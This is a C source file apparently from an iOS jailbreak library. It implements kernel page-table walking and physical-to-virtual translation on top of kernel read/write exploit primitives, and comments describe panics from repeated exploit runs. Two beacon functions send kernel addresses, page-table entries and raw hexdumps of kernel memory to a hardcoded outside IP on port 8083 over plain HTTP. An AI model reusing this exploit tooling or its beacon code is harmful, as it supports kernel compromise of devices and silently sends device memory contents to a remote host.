#include "translation.h"
#include "primitives.h"
#include "kernel.h"
#include "info.h"
#include <errno.h>
#include <stdio.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>

struct tt_level arm_tt_level[4];

void jb_tr_beacon(const char *fmt, ...)
{
	char msg[512];
	va_list ap;
	va_start(ap, fmt);
	vsnprintf(msg, sizeof(msg), fmt, ap);
	va_end(ap);
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) return;
	struct timeval tv = { .tv_sec = 0, .tv_usec = 300000 };
	setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
	struct sockaddr_in sa;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(8083);
	inet_pton(AF_INET, "100.103.252.76", &sa.sin_addr);
	char req[600];
	snprintf(req, sizeof(req), "GET /?msg=%s HTTP/1.0\r\nHost: beacon\r\n\r\n", msg);
	if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
		send(fd, req, strlen(req), 0);
	}
	close(fd);
}

// v20: self-contained beacon (same shape as lb_beacon in util.c, kept separate
// so translation.c has no dependency ordering on util.c)
static void tr_beacon(const char *fmt, ...)
{
	char msg[512];
	va_list ap;
	va_start(ap, fmt);
	vsnprintf(msg, sizeof(msg), fmt, ap);
	va_end(ap);
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) return;
	struct timeval tv = { .tv_sec = 0, .tv_usec = 300000 };
	setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
	struct sockaddr_in sa;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(8083);
	if (inet_pton(AF_INET, "100.103.252.76", &sa.sin_addr) != 1) { close(fd); return; }
	if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
		char req[1280];
		char enc[1024]; size_t ei = 0;
		static const char hex[] = "0123456789ABCDEF";
		for (const char *p = msg; *p && ei < sizeof(enc) - 4; p++) {
			unsigned char c = (unsigned char)*p;
			if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')) enc[ei++] = (char)c;
			else { enc[ei++] = '%'; enc[ei++] = hex[c >> 4]; enc[ei++] = hex[c & 15]; }
		}
		enc[ei] = 0;
		int n = snprintf(req, sizeof(req),
			"GET /?msg=%s HTTP/1.1\r\nHost: 100.103.252.76\r\nConnection: close\r\n\r\n", enc);
		if (n > 0) { size_t len = (size_t)n; ssize_t w = write(fd, req, len); (void)w; }
	}
	close(fd);
}

// v20: known-good kernel VA windows for wander-guarding phystokv() results.
// Populated lazily on first use from kconstants + the resolved ptov/papt tables.
#define PTOV_TABLE_SIZE_ 8
static struct {
	uint64_t lo;
	uint64_t hi;
} tr_guard_windows[48];
static int tr_guard_window_count = 0;
static bool tr_guard_inited = false;

// Address translation physical <-> virtual

// v20 classification result of the last phystokv call
enum {
	P2V_NONE = 0,
	P2V_PTOV,
	P2V_PAPT,
	P2V_FALLBACK,
};
static const char *tr_p2v_mode_name(int mode)
{
	switch (mode) {
		case P2V_PTOV:     return "ptov";
		case P2V_PAPT:     return "papt";
		case P2V_FALLBACK: return "fallback";
		default:           return "none";
	}
}

uint64_t sptm_phystokv(uint64_t pa)
{
	uint64_t papt_table = kread_ptr(ksymbol(libsptm_papt_ranges));
	uint64_t papt_table_n = kread32(kread64(ksymbol(libsptm_n_papt_ranges)));

	struct sptm_papt_entry {
		uint64_t paddr_start;
		uint64_t papt_start;
		uint64_t num_mappings;
	} sptm_papt_table[papt_table_n];

	kreadbuf(papt_table, &sptm_papt_table[0], sizeof(sptm_papt_table));

	for (uint64_t i = 0; i < papt_table_n; i++) {
		struct sptm_papt_entry *curEntry = &sptm_papt_table[i];

		uint64_t len = curEntry->num_mappings * vm_real_kernel_page_size;
		if ((pa >= curEntry->paddr_start) && (pa < (curEntry->paddr_start + len))) {
			// v24: va==0 entries are PHYSICAL-ONLY (no linear alias exists).
			// Aliasing through them yields a tiny garbage VA; storing through
			// that killed every post-WIN run (the +0x6334 family). Bail clean.
			if (curEntry->papt_start == 0) {
				errno = 1047;
				return 0;
			}
			return pa - curEntry->paddr_start + curEntry->papt_start;
		}
	}

	return 0;
}

// v23: write-path tripwire, re-keyed. v22's PA-span rule (idx<=1 refuse)
// also blocked LEGITIMATE pmap metadata writes -- their aliases land in the
// kernel data region just above kbase (observed kbase+0x5E0000..0x700000),
// and v21 completed EXPAND with those writes flowing. The only target class
// that is NEVER legitimately written is the execute-only __TEXT_EXEC region.
// Cross-boot forensic anchor: execBase == kbase + 0x1058000 on every captured
// panic (boots ...034555, ...143240, ...162252). We refuse aliases landing in
// [kbase+0xF00000, kbase+0x2000000) -- covers exec text with margin on both
// sides while leaving data/bss and all DRAM-linear aliases untouched.
// Returns 0 to allow, 1046 + beacon on refusal.
int tr_write_guard(uint64_t pa)
{
	static bool wg_inited = false;
	static uint64_t wg_lo = 0, wg_hi = 0;
	if (!wg_inited) {
		wg_inited = true;
		uint64_t kbase = kconstant(staticBase) + kconstant(slide);
		if (kbase) {
			wg_lo = kbase + 0xF00000ULL;
			wg_hi = kbase + 0x2000000ULL;
		}
		tr_beacon("TEXTGUARD kbase=%#llx execwin=[%#llx,%#llx)",
			(unsigned long long)kbase,
			(unsigned long long)wg_lo, (unsigned long long)wg_hi);
	}
	if (!wg_lo) return 0;
	if (!ksymbol(libsptm_papt_ranges)) return 0;

	uint64_t papt_table = kread_ptr(ksymbol(libsptm_papt_ranges));
	uint64_t papt_table_n = kread32(kread64(ksymbol(libsptm_n_papt_ranges)));
	if (!papt_table || !papt_table_n) return 0;
	if (papt_table_n > 24) papt_table_n = 24;

	struct {
		uint64_t paddr_start;
		uint64_t papt_start;
		uint64_t num_mappings;
	} ents[24];
	kreadbuf(papt_table, &ents[0], papt_table_n * sizeof(ents[0]));

	for (uint64_t i = 0; i < papt_table_n; i++) {
		uint64_t len = ents[i].num_mappings * vm_real_kernel_page_size;
		if ((pa >= ents[i].paddr_start) && (pa < (ents[i].paddr_start + len))) {
			uint64_t alias_va = pa - ents[i].paddr_start + ents[i].papt_start;
			if (alias_va < 0xffffff8000000000ULL) {
				tr_beacon("TEXTWRITE-ALIASBAD idx=%llu pa=%#llx va=%#llx",
					(unsigned long long)i,
					(unsigned long long)pa, (unsigned long long)alias_va);
				errno = 1047;
				return 1047;
			}
			if (alias_va >= wg_lo && alias_va < wg_hi) {
				tr_beacon("TEXTWRITE-REFUSED idx=%llu pa=%#llx va=%#llx",
					(unsigned long long)i,
					(unsigned long long)pa, (unsigned long long)alias_va);
				errno = 1046;
				return 1046;
			}
			break;
		}
	}
	return 0;
}

// v25: DESTINATION-VA guard for kwritebuf(). The v24 panic (pc execBase+0x6334,
// bcopy stp tail, far=kbase+0x5B9C478, x2=0x10, x3=0x1337) rode the kwritebuf
// path with ZERO ALIAS-WRITE beacons -- physwritebuf tr_write_guard never saw
// it. far decoded as: inside the overall kernel static VA span but NOT in any
// PAPT alias window and NOT in the kernel image => a wild destination no legit
// data write should produce. Refuse exactly that class: canonical static-span
// VAs falling in the gaps between legit windows. 1048 + beacon on refusal.
int tr_vwrite_guard(uint64_t va)
{
	static bool vg_inited = false;
	static uint64_t vg_lo = 0, vg_hi = 0;
	if (!vg_inited) {
		vg_inited = true;
		uint64_t kbase = kconstant(staticBase) + kconstant(slide);
		if (kbase) {
			vg_lo = kbase;
			vg_hi = kbase + 0x2000000ULL;
		}
		tr_beacon("VWRITEGUARD armed span=[%#llx,%#llx)",
			(unsigned long long)vg_lo, (unsigned long long)vg_hi);
	}
	if (!vg_lo) return 0;
	if (va < vg_lo || va >= vg_hi) return 0;

	if (!ksymbol(libsptm_papt_ranges)) {
		tr_beacon("VWRITE-REFUSED nopapt va=%#llx", (unsigned long long)va);
		errno = 1048;
		return 1048;
	}
	uint64_t papt_table = kread_ptr(ksymbol(libsptm_papt_ranges));
	uint64_t papt_table_n = kread32(kread64(ksymbol(libsptm_n_papt_ranges)));
	if (!papt_table || !papt_table_n) return 0;
	if (papt_table_n > 24) papt_table_n = 24;

	struct {
		uint64_t paddr_start;
		uint64_t papt_start;
		uint64_t num_mappings;
	} ents[24];
	kreadbuf(papt_table, &ents[0], papt_table_n * sizeof(ents[0]));

	for (uint64_t i = 0; i < papt_table_n; i++) {
		uint64_t len = ents[i].num_mappings * vm_real_kernel_page_size;
		uint64_t wlo = ents[i].papt_start;
		uint64_t whi = ents[i].papt_start + len;
		if (wlo && va >= wlo && va < whi) return 0;
	}
	tr_beacon("VWRITE-REFUSED hole va=%#llx", (unsigned long long)va);
	errno = 1048;
	return 1048;
}

// v22: last-ditch trap classifier -- a userspace SIGSEGV/SIGBUS here means
// SPTM rejected a userland-mapped access. Beacon it and die loudly instead
// of looking like another silent dud.
static void tr_trap_handler(int sig, siginfo_t *si, void *ctx)
{
	tr_beacon("WRITE-TRAP sig=%d far=%#llx", sig, (unsigned long long)(uintptr_t)si->si_addr);
	signal(sig, SIG_DFL);
	// returning re-executes the faulting instruction -> visible crash
}

static void tr_install_trap_handler(void)
{
	struct sigaction sa = {};
	sa.sa_sigaction = tr_trap_handler;
	sa.sa_flags = SA_SIGINFO;
	sigaction(SIGSEGV, &sa, NULL);
	sigaction(SIGBUS, &sa, NULL);
}

// v20: out_mode classifies which path produced the answer (for beacons/guards)
static uint64_t phystokv_ex(uint64_t pa, int *out_mode)
{
	int mode = P2V_NONE;
	uint64_t va = 0;

	if (ksymbol(ptov_table)) {
		struct ptov_table_entry {
			uint64_t pa;
			uint64_t va;
			uint64_t len;
		} ptov_table[PTOV_TABLE_SIZE_];
		kreadbuf(ksymbol(ptov_table), &ptov_table[0], sizeof(ptov_table));

		for (uint64_t i = 0; (i < PTOV_TABLE_SIZE_) && (ptov_table[i].len != 0); i++) {
			if ((pa >= ptov_table[i].pa) && (pa < (ptov_table[i].pa + ptov_table[i].len))) {
				va = pa - ptov_table[i].pa + ptov_table[i].va;
				mode = P2V_PTOV;
				goto done;
			}
		}

		// v21: ptov resolved but missed this PA. On SPTM platforms (PAPT
		// present) try the PAPT and NOTHING else. Run 3 (08-23 14:32) proved
		// the naive arithmetic lands inside PAPT spans -- kernelcache text/
		// exec is papt[1] @ 0xfffffff04c2f0000 -- and detonates at
		// textexec+0x6334. Arithmetic is now reachable ONLY on legacy boots
		// where neither ptov_table nor libsptm_papt_ranges resolved.
		if (ksymbol(libsptm_papt_ranges)) {
			va = sptm_phystokv(pa);
			if (va) mode = P2V_PAPT;
		} else {
			va = pa - kconstant(physBase) + kconstant(virtBase);
			mode = P2V_FALLBACK;
		}
	}
	else if (ksymbol(libsptm_papt_ranges)) {
		va = sptm_phystokv(pa);
		mode = va ? P2V_PAPT : P2V_NONE;
	}

done:
	if (out_mode) *out_mode = mode;
	return va;
}

uint64_t phystokv(uint64_t pa)
{
	int mode = P2V_NONE;
	return phystokv_ex(pa, &mode);
}

// v20: one-time telemetry dump of everything phystokv depends on
static bool tr_telemetry_done = false;
static void tr_phystokv_telemetry_once(void)
{
	if (tr_telemetry_done) return;
	tr_telemetry_done = true;
	tr_install_trap_handler(); // v22
	{
		tr_beacon("P2V init ptov_sym=%#llx papt_sym=%#llx physBase=%#llx virtBase=%#llx",
			(unsigned long long)ksymbol(ptov_table),
			(unsigned long long)ksymbol(libsptm_papt_ranges),
			(unsigned long long)kconstant(physBase),
			(unsigned long long)kconstant(virtBase));

		if (ksymbol(ptov_table)) {
			struct ptov_table_entry {
				uint64_t pa;
				uint64_t va;
				uint64_t len;
			} ptov_table[PTOV_TABLE_SIZE_];
			kreadbuf(ksymbol(ptov_table), &ptov_table[0], sizeof(ptov_table));
			for (int i = 0; i < PTOV_TABLE_SIZE_; i++) {
				tr_beacon("P2V ptov[%d] pa=%#llx va=%#llx len=%#llx", i,
					(unsigned long long)ptov_table[i].pa,
					(unsigned long long)ptov_table[i].va,
					(unsigned long long)ptov_table[i].len);
			}
		}

		if (ksymbol(libsptm_papt_ranges)) {
			uint64_t papt_table = kread_ptr(ksymbol(libsptm_papt_ranges));
			uint64_t papt_table_n = kread32(kread64(ksymbol(libsptm_n_papt_ranges)));
			tr_beacon("P2V papt table=%#llx n=%llu",
				(unsigned long long)papt_table, (unsigned long long)papt_table_n);
			if (papt_table_n > 24) papt_table_n = 24; // bounded, covers n=22 boots
			struct sptm_papt_entry {
				uint64_t paddr_start;
				uint64_t papt_start;
				uint64_t num_mappings;
			} sptm_papt_table[papt_table_n];
			kreadbuf(papt_table, &sptm_papt_table[0], sizeof(sptm_papt_table));
			for (uint64_t i = 0; i < papt_table_n; i++) {
				tr_beacon("P2V papt[%llu] pa=%#llx va=%#llx nmap=%llu",
					(unsigned long long)i,
					(unsigned long long)sptm_papt_table[i].paddr_start,
					(unsigned long long)sptm_papt_table[i].papt_start,
					(unsigned long long)sptm_papt_table[i].num_mappings);
			}
			// v22: raw hexdump to discover TRUE entry stride + perm/attribution fields
			{
				uint8_t raw[640];
				static const char hx[] = "0123456789abcdef";
				char hex[193];
				kreadbuf(papt_table, raw, sizeof(raw));
				for (uint64_t off = 0; off < sizeof(raw); off += 64) {
					for (int b = 0; b < 64; b++) {
						hex[b*2]   = hx[raw[off+b] >> 4];
						hex[b*2+1] = hx[raw[off+b] & 0xf];
					}
					hex[192] = 0;
					tr_beacon("P2VRAW o=%#llx %s", (unsigned long long)off, hex);
				}
			}
		}
	}
}

// v20: build known-good VA windows from the same sources phystokv uses
static void tr_guard_init(void)
{
	if (tr_guard_inited) return;
	tr_guard_inited = true;

	int n = 0;

	if (ksymbol(ptov_table)) {
		struct ptov_table_entry {
			uint64_t pa;
			uint64_t va;
			uint64_t len;
		} ptov_table[PTOV_TABLE_SIZE_];
		kreadbuf(ksymbol(ptov_table), &ptov_table[0], sizeof(ptov_table));
		for (int i = 0; i < PTOV_TABLE_SIZE_ && n < (int)(sizeof(tr_guard_windows)/sizeof(tr_guard_windows[0])); i++) {
			if (ptov_table[i].len != 0) {
				tr_guard_windows[n].lo = ptov_table[i].va;
				tr_guard_windows[n].hi = ptov_table[i].va + ptov_table[i].len;
				n++;
			}
		}
	}

	if (ksymbol(libsptm_papt_ranges)) {
		uint64_t papt_table = kread_ptr(ksymbol(libsptm_papt_ranges));
		uint64_t papt_table_n = kread32(kread64(ksymbol(libsptm_n_papt_ranges)));
		if (papt_table_n > 32) papt_table_n = 32;
		struct sptm_papt_entry {
			uint64_t paddr_start;
			uint64_t papt_start;
			uint64_t num_mappings;
		} sptm_papt_table[papt_table_n ? papt_table_n : 1];
		if (papt_table_n) {
			kreadbuf(papt_table, &sptm_papt_table[0], sizeof(sptm_papt_table));
			for (uint64_t i = 0; i < papt_table_n && n < (int)(sizeof(tr_guard_windows)/sizeof(tr_guard_windows[0])); i++) {
				tr_guard_windows[n].lo = sptm_papt_table[i].papt_start;
				tr_guard_windows[n].hi = sptm_papt_table[i].papt_start +
					(sptm_papt_table[i].num_mappings * vm_real_kernel_page_size);
				n++;
			}
		}
	}

	// v20 STRICT GUARD: only fall back to the classic kernel window when we
	// have NO real ptov/papt data. On A18/SPTM both tables exist, so any
	// phystokv result outside them is suspect -- including the naive
	// pa-physBase+virtBase arithmetic that produced the +0x6334 panics
	// (far=0xfffffff04cd29ba8 lands inside virtBase+2GB, so a blanket
	// window here would defeat the whole guard).
	if (n == 0) {
		uint64_t vb = kconstant(virtBase);
		tr_guard_windows[n].lo = vb;
		tr_guard_windows[n].hi = vb + 0x80000000ULL; // 2GB kernel span
		n++;
	}

	tr_guard_window_count = n;
}

// v20: returns true if va falls inside a known-good kernel VA window
bool tr_va_in_known_window(uint64_t va)
{
	tr_guard_init();
	for (int i = 0; i < tr_guard_window_count; i++) {
		if (va >= tr_guard_windows[i].lo && va < tr_guard_windows[i].hi) return true;
	}
	return false;
}

uint64_t vtophys_lvl(uint64_t tte_ttep, uint64_t va, uint64_t *leaf_level, uint64_t *leaf_tte_ttep)
{
	errno = 0;
	const uint64_t ROOT_LEVEL = PMAP_TT_L1_LEVEL;
	const uint64_t LEAF_LEVEL = *leaf_level;

	uint64_t pa = 0;

	bool physical = !(bool)(tte_ttep & 0xf000000000000000);

	static bool telemetry_done = false;
	if (!telemetry_done) {
		telemetry_done = true;
		tr_phystokv_telemetry_once();
		tr_guard_init();
		tr_beacon("GUARD armed windows=%d root=%llu policy=%s", tr_guard_window_count,
			(unsigned long long)ROOT_LEVEL,
			ksymbol(ptov_table) ? "ptov" : (ksymbol(libsptm_papt_ranges) ? "papt-only" : "legacy"));
	}

	for (uint64_t curLevel = ROOT_LEVEL; curLevel <= LEAF_LEVEL; curLevel++) {
		if (curLevel > PMAP_TT_L3_LEVEL) {
			errno = 1041;
			return 0;
		}

		struct tt_level *lvlp = &arm_tt_level[curLevel];
		uint64_t tteIndex = (va & lvlp->indexMask) >> lvlp->shift;
		uint64_t tteEntry = 0;
		if (physical) {
			uint64_t tte_pa = tte_ttep + (tteIndex * sizeof(uint64_t));
			tteEntry = physread64(tte_pa);
			if (leaf_tte_ttep) *leaf_tte_ttep = tte_pa;
			if (leaf_level) *leaf_level = curLevel;
		}
		else if (gPrimitives.kreadbuf && !physical) {
			uint64_t tte_va = tte_ttep + (tteIndex * sizeof(uint64_t));
			tteEntry = kread64(tte_va);
			if (leaf_tte_ttep) *leaf_tte_ttep = tte_va;
			if (leaf_level) *leaf_level = curLevel;
		}
		else {
			printf("WARNING: Failed %s translation, no function to do it.\n", physical ? "physical" : "virtual");
			errno = 1043;
			return 0;
		}

		if ((tteEntry & lvlp->validMask) != lvlp->validMask) {
			errno = 1042;
			return 0;
		}

		if ((tteEntry & lvlp->typeMask) == lvlp->typeBlock) {
			// Found block mapping, no matter what level we are in, this is the end
			return ((tteEntry & ARM_TTE_PA_MASK & ~lvlp->offMask) | (va & lvlp->offMask));
		}

		if (physical) {
			tte_ttep = tteEntry & ARM_TTE_TABLE_MASK;
		}
		else {
			uint64_t srcPa = tteEntry & ARM_TTE_TABLE_MASK;
			int mode = P2V_NONE;
			uint64_t nextTtep = phystokv_ex(srcPa, &mode);

			// v21 WANDER GUARD (strict): with the arithmetic fallback gone,
			// a zero/fallback answer means this PA is in NO known region.
			// Also require page alignment -- real TT table pointers always
			// are, and the killer far (...29ba8) was not.
			bool alignOk = ((nextTtep & (vm_real_kernel_page_size - 1)) == 0);
			if (!nextTtep || !alignOk || !tr_va_in_known_window(nextTtep)) {
				tr_beacon("EXPAND-WANDER va=%#llx lvl=%llu src_tte=%#llx pa=%#llx tte_va=%#llx mode=%s cand=%#llx%s",
					(unsigned long long)va, (unsigned long long)curLevel,
					(unsigned long long)tteEntry,
					(unsigned long long)srcPa,
					(unsigned long long)(tte_ttep + (tteIndex * sizeof(uint64_t))),
					tr_p2v_mode_name(mode),
					(unsigned long long)nextTtep,
					alignOk ? "" : " MISALIGN");
				errno = 1045;
				return 0;
			}

			tte_ttep = nextTtep;
		}
	}

	// If we end up here, it means we did not find a block mapping
	// In this case, return the last page table address we traversed
	return tte_ttep;
}

uint64_t vtophys(uint64_t tte_ttep, uint64_t va)
{
	uint64_t level = PMAP_TT_L3_LEVEL;
	return vtophys_lvl(tte_ttep, va, &level, NULL);
}

uint64_t kvtophys(uint64_t va)
{
	return vtophys(kconstant(cpuTTEP), va);
}

void libjailbreak_translation_init(void)
{
	// A9+: Kernel uses 16K pages
	if (vm_real_kernel_page_size == 0x4000) {
		arm_tt_level[0] = (struct tt_level){
			.offMask = ARM_16K_TT_L0_OFFMASK,
			.shift = ARM_16K_TT_L0_SHIFT,
			.indexMask = ARM_16K_TT_L0_INDEX_MASK,
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_BLOCK,
		};
		arm_tt_level[1] = (struct tt_level){
			.offMask = ARM_16K_TT_L1_OFFMASK,
			.shift = ARM_16K_TT_L1_SHIFT,
			.indexMask = kconstant(ARM_TT_L1_INDEX_MASK),
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_BLOCK,
		};
		arm_tt_level[2] = (struct tt_level){
			.offMask = ARM_16K_TT_L2_OFFMASK,
			.shift = ARM_16K_TT_L2_SHIFT,
			.indexMask = ARM_16K_TT_L2_INDEX_MASK,
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_BLOCK,
		};
		arm_tt_level[3] = (struct tt_level){
			.offMask = ARM_16K_TT_L3_OFFMASK,
			.shift = ARM_16K_TT_L3_SHIFT,
			.indexMask = ARM_16K_TT_L3_INDEX_MASK,
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_L3BLOCK,
		};
	}
	// A8: Kernel uses 4k pages
	else if (vm_real_kernel_page_size == 0x1000) {
		arm_tt_level[0] = (struct tt_level){
			.offMask = ARM_4K_TT_L0_OFFMASK,
			.shift = ARM_4K_TT_L0_SHIFT,
			.indexMask = ARM_4K_TT_L0_INDEX_MASK,
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_BLOCK,
		};
		arm_tt_level[1] = (struct tt_level){
			.offMask = ARM_4K_TT_L1_OFFMASK,
			.shift = ARM_4K_TT_L1_SHIFT,
			.indexMask = kconstant(ARM_TT_L1_INDEX_MASK),
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_BLOCK,
		};
		arm_tt_level[2] = (struct tt_level){
			.offMask = ARM_4K_TT_L2_OFFMASK,
			.shift = ARM_4K_TT_L2_SHIFT,
			.indexMask = ARM_4K_TT_L2_INDEX_MASK,
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_BLOCK,
		};
		arm_tt_level[3] = (struct tt_level){
			.offMask = ARM_4K_TT_L3_OFFMASK,
			.shift = ARM_4K_TT_L3_SHIFT,
			.indexMask = ARM_4K_TT_L3_INDEX_MASK,
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_L3BLOCK,
		};
	}

	gPrimitives.phystokv = phystokv;
	gPrimitives.vtophys  = vtophys;
}
